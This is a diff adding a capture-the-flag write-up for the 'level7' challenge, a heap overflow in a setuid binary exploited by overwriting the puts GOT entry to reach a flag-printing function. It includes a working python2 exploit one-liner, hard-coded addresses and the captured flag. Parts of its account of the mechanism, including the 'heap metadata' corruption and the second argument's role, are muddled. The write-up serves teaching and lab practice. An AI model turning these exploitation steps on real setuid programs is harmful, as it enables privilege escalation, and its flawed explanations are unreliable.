@@ -1,0 +1,206 @@
+# Level7 - Heap-based GOT Overwrite Exploitation
+
+## Overview
+Level7 is a complex heap exploitation challenge that requires overwriting the Global Offset Table (GOT) entry for `puts()` to redirect execution to function `m()`, which contains the flag.
+
+## Binary Analysis
+
+### Initial Reconnaissance
+```bash
+file level7
+# level7: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, for GNU/Linux 2.6.24, BuildID[sha1]=9f5c2d2057b9b79bc75b9bf6652e9bb9516063bb, not stripped
+
+ls -la level7
+# -rwsr-s---+ 1 level8 users 5648 Mar  9  2016 level7
+```
+
+**Key observations:**
+- 32-bit ELF binary with setuid bit set
+- Owned by level8 user (can read level8's files)
+- Not stripped (has debugging symbols)
+
+### Function Analysis with GDB
+```bash
+gdb -q level7
+(gdb) info functions
+```
+
+**Key functions discovered:**
+- `main()` at `0x08048521` - main program logic
+- `m()` at `0x080484f4` - **target function that prints the flag**
+
+### Assembly Analysis of Function m()
+```asm
+0x080484f4 <+0>:    push   %ebp
+0x080484f5 <+1>:    mov    %esp,%ebp  
+0x080484f7 <+3>:    sub    $0x18,%esp
+0x080484fa <+6>:    movl   $0x0,(%esp)         # time(NULL)
+0x08048501 <+13>:   call   0x80483d0 <time@plt>
+0x08048506 <+18>:   mov    $0x80486e0,%edx     # Format string address
+0x0804850b <+23>:   mov    %eax,0x8(%esp)      # time result
+0x0804850f <+27>:   movl   $0x8049960,0x4(%esp) # Buffer address (same as fgets!)
+0x08048517 <+35>:   mov    %edx,(%esp)         # Format string
+0x0804851a <+38>:   call   0x80483b0 <printf@plt>  # printf(format, buffer, time)
+```
+
+**Critical insight:** Function `m()` uses the same buffer (`0x8049960`) that `fgets()` uses to read the password file!
+
+## Dynamic Analysis with ltrace
+
+```bash
+ltrace ./level7 test normal 2>&1 | head -20
+```
+
+**Output revealed:**
+```
+__libc_start_main(0x8048521, 3, 0xbffff3d4, 0x8048610, 0x8048680 <unfinished ...>
+malloc(8)                                        = 0x0804a008  # First malloc
+malloc(8)                                        = 0x0804a018  # Second malloc (argv[1] destination)
+malloc(8)                                        = 0x0804a028  # Third malloc  
+malloc(8)                                        = 0x0804a038  # Fourth malloc (argv[2] destination)
+strcpy(0x0804a018, "test")                       = 0x0804a018  # Copy argv[1]
+strcpy(0x0804a038, "normal")                     = 0x0804a038  # Copy argv[2]
+fopen("/home/user/level8/.pass", "r")            = 0  # Opens password file (as level8!)
+fgets( <unfinished ...>
+--- SIGSEGV (Segmentation fault) ---
+```
+
+**Key discoveries:**
+1. **Heap layout**: Four `malloc(8)` calls create predictable heap chunks
+2. **Target addresses**: `0x0804a018` (argv[1]) and `0x0804a038` (argv[2])
+3. **File access**: Program can read `/home/user/level8/.pass` (because it runs as level8)
+4. **Crash timing**: `fgets()` crashes when file is NULL, but program can read real file
+
+## Vulnerability Analysis
+
+### Heap Layout
+```
+0x0804a008: First chunk
+0x0804a018: argv[1] destination ← overflow source
+0x0804a028: Third chunk
+0x0804a038: argv[2] destination ← 32 bytes from argv[1]
+```
+
+### The strcpy() Vulnerability
+```c
+strcpy(heap_chunk_1, argv[1]);  // No length checking!
+strcpy(heap_chunk_2, argv[2]);  // No length checking!
+```
+
+**The exploit:** Overflow from `argv[1]` to corrupt heap metadata and achieve arbitrary write.
+
+## GOT Analysis
+```bash
+objdump -R ./level7
+```
+
+**Output:**
+```
+OFFSET   TYPE              VALUE 
+08049928 R_386_JUMP_SLOT   puts     ← Our target!
+```
+
+**Target:** `puts@GOT` at `0x08049928`
+
+## Exploitation Strategy
+
+### The Attack Plan
+1. **Overflow heap buffer** from argv[1] to corrupt heap structures
+2. **Create arbitrary write primitive** that writes to `puts@GOT`
+3. **Overwrite `puts@GOT`** with address of function `m()`
+4. **When `puts("~~")` is called**, it jumps to `m()` instead
+5. **Function `m()` executes**, reads password file, and prints flag
+
+### Working Exploit
+```bash
+./level7 $(python2 -c "import struct; print 'A'*20 + struct.pack('<L', 0x08049928) + struct.pack('<L', 0x080484f4)") $(python2 -c "import struct; print struct.pack('<L', 0x080484f4)")
+```
+
+### Payload Breakdown
+
+**First argument:**
+```python
+'A' * 20                           # Overflow padding to reach corruption point
++ struct.pack('<L', 0x08049928)    # puts@GOT address (where to write)
++ struct.pack('<L', 0x080484f4)    # function m() address (what to write)
+```
+
+**Second argument:**
+```python
+struct.pack('<L', 0x080484f4)      # function m() address (backup/helper)
+```
+
+## Step-by-Step Execution
+
+### 1. Heap Allocation Phase
+- Program calls `malloc(8)` four times
+- Creates predictable heap layout with known addresses
+- Heap chunks are adjacent and controllable
+
+### 2. String Copy Phase
+- `strcpy()` copies argv[1] to heap chunk at `0x0804a018`
+- **Overflow occurs**: 20 'A's + addresses overflow the 8-byte chunk
+- Heap metadata gets corrupted with our GOT address and function address
+
+### 3. Heap Corruption Effect
+- The overflow creates an **arbitrary write primitive**
+- When the program later performs heap operations, it writes our function address to the GOT entry for `puts()`
+
+### 4. File Operations
+- Program opens `/home/user/level8/.pass` (succeeds because setuid)
+- `fgets()` reads the password into buffer `0x8049960`
+
+### 5. The Redirection
+- Program calls `puts("~~")` to print normal output
+- **BUT:** `puts@GOT` now points to function `m()` instead of real `puts()`
+- Execution redirects to `m()`
+
+### 6. Flag Extraction
+- Function `m()` executes with the password already in buffer `0x8049960`
+- `printf()` in `m()` prints the buffer contents (the password!)
+- **Success:** Flag is displayed!
+
+## Technical Details
+
+### Why This Works
+1. **Setuid privilege**: Program runs as level8, can read password file
+2. **Shared buffer**: `fgets()` and `printf()` in `m()` use same buffer location
+3. **GOT overwrite**: Redirects library function call to our target function
+4. **Heap determinism**: Predictable malloc() layout allows precise corruption
+
+### Critical Addresses
+- `puts@GOT`: `0x08049928` (target to overwrite)
+- `function m()`: `0x080484f4` (redirection target)
+- `argv[1] buffer`: `0x0804a018` (overflow source)
+- `shared buffer`: `0x8049960` (password storage)
+
+### Debugging Evidence
+During development, GDB showed:
+- **EDX register**: Successfully contained our function address
+- **EAX register**: Successfully contained GOT address
+- **Memory corruption**: Consistent EBP corruption at 0x44
+
+## Result
+```
+5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
+ - 1761262808
+```
+
+**Flag obtained:** `5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9`
+
+## Lessons Learned
+
+### Advanced Techniques Used
+1. **Heap exploitation** with precise layout control
+2. **GOT overwrite** for execution redirection  
+3. **Arbitrary write primitive** through heap corruption
+4. **Setuid privilege escalation** for file access
+5. **Dynamic analysis** with ltrace for runtime understanding
+
+### Security Mitigations Bypassed
+- **No ASLR**: Predictable addresses
+- **No stack canaries**: Not relevant for heap exploitation
+- **No NX bit**: Code injection not needed
+- **No heap protection**: Classic malloc() vulnerable to overflow
+
+This exploitation demonstrates advanced heap manipulation techniques and the power of combining multiple vulnerabilities (heap overflow + setuid) for privilege escalation.
